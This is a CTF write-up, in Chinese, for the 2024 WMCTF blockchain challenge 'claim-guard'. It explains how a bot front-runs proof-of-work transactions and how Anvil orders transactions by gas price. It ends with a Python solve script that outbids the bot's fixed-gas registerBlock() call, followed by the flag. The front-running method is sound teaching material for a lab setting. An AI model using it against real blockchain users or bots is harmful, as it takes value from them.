---
title: Blockchain - claim-guard
description: 2024 | WMCTF | BlockChain
tags:
    - mev
    - frontrun
    - rust
    - transaction order
---

## 题目

We got a cheater.

> nc claim-guard.wm-team.cn 1337

[:material-download: `claim_guard.zip`](static/claim_guard.zip)

## 解题思路

- 合约 `Chall` 共有三个函数：`registerBlock()`、`proveWork()` 和 `claimLastWinner()`。题目要求 `player`，即给定的 EOA，成为 `lastWinner`。需要 `player` 在同一个块内依次调用三个函数并提供正确的工作证明
- `blockNonce` 记录每个区块中 `proveWork()` 成功执行的次数。只有第一个成功执行 `proveWork()` 的账户能够调用 `claimLastWinner()` 成为 `lastWinner`
- 题目环境中包含一个 bot，会在每个区块调用 `registerBlock()`，并监听 mempool。如果出现能够成功执行 `proveWork()` 的交易，bot 将使用更高的 gas price 试图抢跑对应交易

    ```rs
    // 0x27d4563e
    let sig: [u8; 4] = [0x27, 0xd4, 0x56, 0x3e];
    // concat sig and pow
    let mut data = Vec::with_capacity(4 + 32);
    data.extend_from_slice(&sig);
    data.extend_from_slice(pow.as_slice());
    let bytes = Bytes::from(data);
    let bn = finalized_block.header.number.unwrap();
    let nonce = *self.nonce_map.get(&bn).unwrap();
    let effective_gas_price = tx.gas_price.or(tx.max_fee_per_gas).unwrap_or_default();
    let chain_id = self.provider.get_chain_id().await.unwrap();
    let tx_receipt = TransactionRequest {
        from: Some(self.sender_addr),
        to: Some(TxKind::Call(self.chall_addr)),
        gas_price: Some(effective_gas_price * 2),
        gas: Some(100_0000),
        input: TransactionInput::new(bytes),
        chain_id: Some(chain_id),
        nonce: Some(nonce),

        ..Default::default()
    };
    ```

- 与 `proveWork()` 不同，bot 发送的 `registerBlock()` 交易的 gas price 是固定的

    ```rs
    // register the block
    let tx_receipt = TransactionRequest {
        from: Some(self.sender_addr),
        to: Some(TxKind::Call(self.chall_addr)),
        gas_price: Some(110000000000000000 / 100_0000),
        gas: Some(100_0000),
        chain_id: Some(self.provider.get_chain_id().await.unwrap()),
        nonce: Some(nonce),
        input: hex::decode("0xccac0007").unwrap().into(),
        ..Default::default()
    };
    ```

- Anvil 默认按照 gas price 从高到低对交易进行排序[^default]，同时需要保证每个账户的交易的 `nonce` 是有效的。在实现中采用对独立交易以 gas price 和 FIFO (ready ID) 优先排序的方式。其中，独立交易不依赖其它交易，即 `nonce` 有效可以立即执行。非独立交易将在前置交易执行后解锁并加入到独立交易集合中

    ??? note "TransactionsIterator"

        ```rs
        impl TransactionsIterator {
            /// Depending on number of satisfied requirements insert given ref
            /// either to awaiting set or to best set.
            fn independent_or_awaiting(&mut self, satisfied: usize, tx_ref: PoolTransactionRef) {
                if satisfied >= tx_ref.transaction.requires.len() {
                    // If we have satisfied all deps insert to best
                    self.independent.insert(tx_ref);
                } else {
                    // otherwise we're still awaiting for some deps
                    self.awaiting.insert(tx_ref.transaction.hash(), (satisfied, tx_ref));
                }
            }
        }

        impl Iterator for TransactionsIterator {
            type Item = Arc<PoolTransaction>;

            fn next(&mut self) -> Option<Self::Item> {
                loop {
                    let best = self.independent.iter().next_back()?.clone();
                    let best = self.independent.take(&best)?;
                    let hash = best.transaction.hash();

                    let ready =
                        if let Some(ready) = self.all.get(&hash).cloned() { ready } else { continue };

                    // Insert transactions that just got unlocked.
                    for hash in &ready.unlocks {
                        // first check local awaiting transactions
                        let res = if let Some((mut satisfied, tx_ref)) = self.awaiting.remove(hash) {
                            satisfied += 1;
                            Some((satisfied, tx_ref))
                            // then get from the pool
                        } else {
                            self.all
                                .get(hash)
                                .map(|next| (next.requires_offset + 1, next.transaction.clone()))
                        };
                        if let Some((satisfied, tx_ref)) = res {
                            self.independent_or_awaiting(satisfied, tx_ref)
                        }
                    }

                    return Some(best.transaction)
                }
            }
        }
        ```

    ```rs
    /// transactions that are ready to be included in a block.
    #[derive(Clone, Debug, Default)]
    pub struct ReadyTransactions {
        ...
        /// independent transactions that can be included directly and don't require other transactions
        /// Sorted by their id
        independent_transactions: BTreeSet<PoolTransactionRef>,
    }
    ...
    impl Ord for PoolTransactionRef {
        fn cmp(&self, other: &Self) -> Ordering {
            self.transaction
                .priority
                .cmp(&other.transaction.priority)
                .then_with(|| other.id.cmp(&self.id))
        }
    }
    ```

- 根据 `nonce` 和题目约束，`proveWork()` 只能在 `registerBlock()` 之后执行，因此只需要 `player` 以更高的 `gas_price` 抢跑 bot 的 `registerBlock()` 交易并完成 `proveWork()` 即可

### 解题脚本

```py
from web3 import Web3
from cheb3 import Connection
from cheb3.utils import encode_with_signature
import time, pwn

ticket = b"<ticket>"
HOST = "claim-guard.wm-team.cn"
PORT = 1337

p = pwn.remote(HOST, PORT)
p.sendlineafter(b"ticket", ticket)
p.sendlineafter(b"action?", b"1")
p.recvuntil(b"rpc endpoints")
rpc = p.recvline_contains(b"-").decode().split(" ")[-1]
conn = Connection(rpc)
priv = p.recvline_contains(b"private key").decode().split(" ")[-1]
account = conn.account(priv)
setup = p.recvline_contains(b"contract:").decode().split(" ")[-1]
p.close()

chall = conn.cast_call(setup, "chall()(address)")

pow = 0
bn = conn.w3.eth.get_block_number() + 2
while True:
    h = Web3.solidity_keccak(['uint256', 'uint256'], [pow, bn]).hex()
    if int(h, 16) >> 0xf0 == 0:
        print("Pow:", pow)
        break
    pow += 1
print("Waiting for block", bn)
current_bn = conn.w3.eth.get_block_number() + 1
while bn > current_bn:
    time.sleep(0.5)
    current_bn = conn.w3.eth.get_block_number() + 1
    print("Current block", current_bn)
if bn == current_bn:
    nonce = conn.w3.eth.get_transaction_count(account.address)
    account.send_transaction(chall, data=encode_with_signature("registerBlock()"), wait_for_receipt=False, gas_limit=300000, gas_price=110000000010)
    account.send_transaction(chall, data=encode_with_signature("proveWork(bytes32)", bytes.fromhex(f"{pow:064x}")), nonce=nonce + 1, wait_for_receipt=False, gas_limit=300000, gas_price=110000000010)
    try:
        account.send_transaction(chall, data=encode_with_signature("claimLastWinner(address)", account.address), nonce=nonce + 2, gas_limit=300000)
    except Exception as e:
        print(e)
    lastWinner = conn.cast_call(chall, "lastWinner()(address)")
    print("Player:", account.address)
    print("lastWinner:", lastWinner)
    if account.address == lastWinner:
        p = pwn.remote(HOST, PORT)
        p.sendlineafter(b"ticket", ticket)
        p.sendlineafter(b"action?", b"3")
        p.interactive()
```

### Flag

> WMCTF{is_m3v_this_ea5y}

[^default]: [foundry-rs / foundry](https://github.com/foundry-rs/foundry/blob/master/crates/anvil/src/eth/pool/transactions.rs#L46)
